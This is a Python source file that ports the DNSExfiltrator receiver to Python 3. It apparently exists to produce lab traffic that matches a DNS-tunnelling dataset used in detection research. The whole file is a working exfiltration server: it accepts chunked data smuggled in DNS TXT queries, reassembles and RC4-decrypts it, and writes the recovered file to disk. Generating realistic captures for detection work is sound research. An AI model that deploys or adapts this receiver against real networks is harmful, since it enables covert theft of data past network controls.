#!/usr/bin/env python3
"""DNSExfiltrator receiver, running the lab's exfil DNS server on UDP 53.

Ported from Arno0x's `dnsexfiltrator.py` (github.com/Arno0x/DNSExfiltrator), which
is Python 2 (`xrange`, `print x`) and therefore cannot run on a current base image.
The wire protocol is unchanged, so captures look like the tool the CIC-Bell dataset
used: RC4(zip(file)) encoded base64url (or base32 with -b32), split into <=63-char
labels, one TXT query per chunk, `<i>.<data>...<domain>`, and the server answers each
chunk number as an ACK. Changes: Python 3 bytes handling, `--out` for the reassembled
zip, and logging that a capture run can quote.

    python3 server.py -d exfil.tunnel.test -p <password> --out /out
"""
from __future__ import annotations

import argparse
import socket
import sys
import time
from base64 import b32decode, b64decode
from pathlib import Path

from dnslib import QTYPE, RR, TXT, DNSHeader, DNSRecord


def log(msg: str) -> None:
    print(f"{time.strftime('%H:%M:%S')} {msg}", flush=True)


class RC4:
    """RC4 keystream XOR, same as upstream RC4Encrypt/RC4Decrypt."""

    def __init__(self, key: bytes) -> None:
        self.state = list(range(256))
        x = 0
        for i in range(256):
            x = (key[i % len(key)] + self.state[i] + x) & 0xFF
            self.state[i], self.state[x] = self.state[x], self.state[i]
        self.x = self.y = 0

    def update(self, data: bytes) -> bytes:
        out = bytearray()
        for ch in data:
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            out.append(ch ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytes(out)


def from_base64url(msg: str) -> bytes:
    std = msg.replace("-", "+").replace("_", "/")
    return b64decode(std + "=" * (-len(std) % 4))


def from_base32(msg: str) -> bytes:
    # The upstream padding switch only covers a few remainders and raises on the rest;
    # the general form is what the client's unpadded output actually needs.
    return b32decode(msg.upper() + "=" * (-len(msg) % 8))


def strip_domain(qname: str, domain: str) -> str:
    """The chunk payload: qname minus the trailing exfil domain.

    Callers pass a qname with the root dot already removed, so match both spellings - the
    old `endswith("." + domain + ".")` test never fired on rstrip-ed names and silently
    left the domain suffix inside every chunk's payload, inflating the decoded file.
    """
    suffix = "." + domain.lower()
    low = qname.lower()
    if low.endswith(suffix):
        return qname[: -len(suffix)]
    return qname


def main() -> int:
    ap = argparse.ArgumentParser(description="DNSExfiltrator receiver (lab)")
    ap.add_argument("-d", "--domain", required=True, dest="domain_name")
    ap.add_argument("-p", "--password", required=True)
    ap.add_argument("--out", default="/out", help="directory for reassembled <file>.zip")
    ap.add_argument("--port", type=int, default=53)
    args = ap.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", args.port))
    log(f"listening on udp/{args.port} for {args.domain_name}")

    base32 = False
    chunk_index = 0
    nb_chunks = 0
    file_name = ""
    payload: list[str] = []

    while True:
        data, addr = sock.recvfrom(4096)
        try:
            req = DNSRecord.parse(data)
        except Exception as exc:  # malformed / truncated probe traffic
            log(f"unparsable query from {addr[0]}: {exc}")
            continue

        reply = DNSRecord(DNSHeader(id=req.header.id, qr=1, aa=1, ra=1), q=req.q)
        if req.q.qtype != QTYPE.TXT:
            sock.sendto(reply.pack(), addr)  # authoritative "no such record"
            continue

        qname = str(req.q.qname).rstrip(".")
        if qname.upper().startswith("INIT."):
            parts = qname.split(".")
            meta = from_base32(parts[1]).decode(errors="replace")
            file_name, _, total = meta.partition("|")
            nb_chunks = int(total) if total.isdigit() else 0
            base32 = len(parts) > 2 and parts[2].upper() == "BASE32"
            chunk_index, payload = 0, []
            log(f"init: file={file_name} chunks={nb_chunks} encoding={'base32' if base32 else 'base64url'}")
            reply.add_answer(RR(req.q.qname, QTYPE.TXT, rdata=TXT("OK")))
        else:
            msg = strip_domain(qname, args.domain_name)
            head, sep, raw = msg.partition(".")
            if not sep or not head.isdigit():
                log(f"ignoring non-chunk query {qname!r}")
                sock.sendto(reply.pack(), addr)
                continue
            if int(head) == chunk_index:
                payload.append(raw.replace(".", ""))
                chunk_index += 1
                if chunk_index % 25 == 0 or chunk_index == nb_chunks:
                    log(f"chunk {chunk_index}/{nb_chunks}")
            reply.add_answer(RR(req.q.qname, QTYPE.TXT, rdata=TXT(head)))

        sock.sendto(reply.pack(), addr)

        if nb_chunks and chunk_index == nb_chunks:
            raw = "".join(payload)
            blob = RC4(args.password.encode()).update(from_base32(raw) if base32 else from_base64url(raw))
            out = Path(args.out)
            out.mkdir(parents=True, exist_ok=True)
            target = out / f"{file_name or 'exfil'}.zip"
            target.write_bytes(blob)
            log(f"wrote {target} ({len(blob)} bytes); re-run init to receive again")
            chunk_index, payload, nb_chunks = 0, [], 0

    return 0


if __name__ == "__main__":
    sys.exit(main())
